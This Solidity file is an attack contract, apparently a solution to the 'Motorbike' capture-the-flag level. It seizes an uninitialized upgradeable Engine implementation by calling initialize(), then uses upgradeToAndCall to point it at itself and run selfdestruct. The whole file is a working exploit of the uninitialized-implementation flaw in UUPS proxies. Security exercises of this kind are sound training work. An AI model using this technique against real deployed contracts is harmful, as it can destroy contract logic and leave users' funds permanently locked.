// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Motorbike.sol";

contract MotorbikeAttack {
    Engine target;

    constructor(address _target) {
        target = Engine(_target);
    }

    function destroy() public {
        selfdestruct(payable(address(0)));
    }

    function run() public {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }
}
